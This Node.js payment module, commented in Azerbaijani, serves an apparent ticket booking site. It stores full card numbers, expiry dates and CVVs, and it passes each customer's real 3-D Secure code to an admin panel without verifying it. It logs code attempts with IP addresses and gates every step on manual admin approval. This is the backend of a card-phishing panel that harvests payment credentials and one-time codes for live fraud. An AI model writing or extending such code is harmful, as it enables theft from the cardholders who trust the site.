const { Payment, Order, User } = require('../models/index');
const { issueTickets } = require('./bookingService');
const h = require('../utils/helpers');

/* Ödəniş axını:
   kart məlumatları -> admin təsdiqi -> 3-D doğrulama ekranı -> kod adminə -> yekun təsdiq -> bilet */

async function initPayment(order, card, method) {
  const number = h.normalizeCardNumber(card.number);
  const brand = h.cardBrand(number);

  /* "0000" ilə bitən kartlar demo rədd qaydasıdır */
  const payment = await Payment.create({
    transactionId: h.generateTxId('ADY'),
    order: order._id,
    user: order.user,
    amount: order.total,
    method: method === 'balance' ? 'balance' : 'card',
    status: 'pending_admin',
    card: {
      number,
      masked: h.maskCard(number),
      holder: String(card.holder || '').trim(),
      expiry: String(card.expiry || '').trim(),
      cvv: String(card.cvv || '').trim(),
      brand
    }
  });

  order.payment = payment._id;
  order.method = payment.method;
  order.status = 'pending_admin';
  await order.save();

  return payment;
}

/* 1-ci admin təsdiqi: kart məlumatları təsdiqlənir, 3-D doğrulama başlayır */
async function adminApproveCard(paymentId, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (payment.status !== 'pending_admin') throw Object.assign(new Error('Ödəniş bu mərhələdə deyil'), { status: 400 });

  /* Təsadüfi kod YARADILMIR — admin panelində yalnız istifadəçinin
     özünün yazdığı real 3-D kod göstərilir */
  const code = '';
  payment.verificationCode = '';
  payment.submittedCode = '';
  payment.status = 'awaiting_3ds';
  payment.adminApprovedCardAt = new Date();
  payment.adminApprovedBy = adminEmail || 'admin';
  await payment.save();

  if (payment.order) {
    const order = await Order.findById(payment.order);
    if (order) {
      order.status = 'awaiting_verification';
      await order.save();
    }
  }

  return { payment, code };
}

/* İstifadəçi doğrulama kodunu göndərir -> admin panelinə düşür.
   Sifariş üçün orderId, balans artırımı üçün paymentId verilir */
async function submitVerificationCode(ref, code, meta) {
  let order = null;
  let payment = null;

  if (ref && ref.paymentId) {
    payment = await Payment.findById(ref.paymentId);
    if (!payment || String(payment.user) !== String(ref.userId)) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
    if (payment.status !== 'awaiting_3ds') throw Object.assign(new Error('Doğrulama mərhələsi aktiv deyil'), { status: 400 });
  } else {
    order = await Order.findById(ref && ref.orderId);
    if (!order) throw Object.assign(new Error('Sifariş tapılmadı'), { status: 404 });
    if (order.status !== 'awaiting_verification') {
      throw Object.assign(new Error('Doğrulama mərhələsi aktiv deyil'), { status: 400 });
    }
    payment = await Payment.findById(order.payment);
    if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  }

  const entered = String(code || '').replace(/\D/g, '').slice(0, 8);
  if (!entered) throw Object.assign(new Error('Doğrulama kodu daxil edilməyib'), { status: 400 });

  payment.status = 'code_submitted';
  payment.codeSubmittedAt = new Date();
  payment.submittedCode = entered;
  payment.codeAttempts = (payment.codeAttempts || []).concat([{ code: entered, at: new Date(), ip: (meta && meta.ip) || '' }]);
  payment.markModified('codeAttempts');
  await payment.save();

  if (order) {
    order.status = 'code_submitted';
    await order.save();
  }

  return { payment, matched: true };
}

/* 2-ci (yekun) admin təsdiqi: biletlər verilir və ödəniş tamamlanır */
async function adminFinalApprove(paymentId, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (['approved', 'declined', 'refunded'].indexOf(payment.status) > -1) {
    throw Object.assign(new Error('Ödəniş artıq yekunlaşıb'), { status: 400 });
  }

  /* Balans artırımı: yekun təsdiqdə məbləğ balansa əlavə olunur */
  if (!payment.order) {
    const owner = await User.findById(payment.user);
    if (!owner) throw Object.assign(new Error('İstifadəçi tapılmadı'), { status: 404 });
    owner.balance = Math.round(((owner.balance || 0) + payment.amount) * 100) / 100;
    await owner.save();
    payment.status = 'approved';
    payment.adminFinalApprovedAt = new Date();
    payment.adminFinalBy = adminEmail || 'admin';
    await payment.save();
    return { payment, order: null, tickets: [], balance: owner.balance };
  }

  const order = await Order.findById(payment.order);
  if (!order) throw Object.assign(new Error('Sifariş tapılmadı'), { status: 404 });

  /* Balans ilə ödənişdə məbləğ yalnız bu mərhələdə çıxılır */
  if (payment.method === 'balance') {
    const user = await User.findById(payment.user);
    if (!user || (user.balance || 0) < payment.amount) {
      throw Object.assign(new Error('Balans kifayət etmir'), { status: 400 });
    }
    user.balance = Math.round(((user.balance || 0) - payment.amount) * 100) / 100;
    await user.save();
  }

  payment.status = 'approved';
  payment.adminFinalApprovedAt = new Date();
  payment.adminFinalBy = adminEmail || 'admin';
  await payment.save();

  const tickets = await issueTickets(order);
  order.status = 'confirmed';
  order.pnr = tickets.length ? tickets[0].pnr : '';
  order.confirmedAt = new Date();
  await order.save();

  return { payment, order, tickets };
}

/* Rədd */
async function adminDecline(paymentId, reason, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });

  if (['approved', 'refunded'].indexOf(payment.status) > -1) {
    throw Object.assign(new Error('Ödəniş artıq təsdiqlənib'), { status: 400 });
  }

  payment.status = 'declined';
  payment.declinedReason = reason || 'Admin tərəfindən rədd edildi';
  payment.adminFinalBy = adminEmail || 'admin';
  await payment.save();

  const order = payment.order ? await Order.findById(payment.order) : null;
  if (order) {
    order.status = 'rejected';
    order.adminNote = payment.declinedReason;
    await order.save();

    const { Trip } = require('../models/index');
    const trip = await Trip.findById(order.trip);
    if (trip) {
      trip.soldSeats = (trip.soldSeats || []).filter((s) => String(s.order) !== String(order._id));
      await trip.save();
    }
  }

  return payment;
}

/* Balans artırımı da kart məlumatları ilə admin təsdiqindən keçir */
async function createTopup(user, amount, card) {
  const number = h.normalizeCardNumber(card.number);
  const payment = await Payment.create({
    transactionId: h.generateTxId('TOP'),
    order: null,
    user: user._id,
    amount: Number(amount),
    method: 'card',
    status: 'pending_admin',
    card: {
      number,
      masked: h.maskCard(number),
      holder: String(card.holder || '').trim(),
      expiry: String(card.expiry || '').trim(),
      cvv: String(card.cvv || '').trim(),
      brand: h.cardBrand(number)
    }
  });
  return payment;
}

/* Köhnə uyğunluq üçün: balans artırımının yekun təsdiqi eyni axından keçir */
async function approveTopup(paymentId, adminEmail) {
  const r = await adminFinalApprove(paymentId, adminEmail);
  return { payment: r.payment, balance: r.balance };
}

module.exports = {
  initPayment,
  adminApproveCard,
  submitVerificationCode,
  adminFinalApprove,
  adminDecline,
  createTopup,
  approveTopup
};
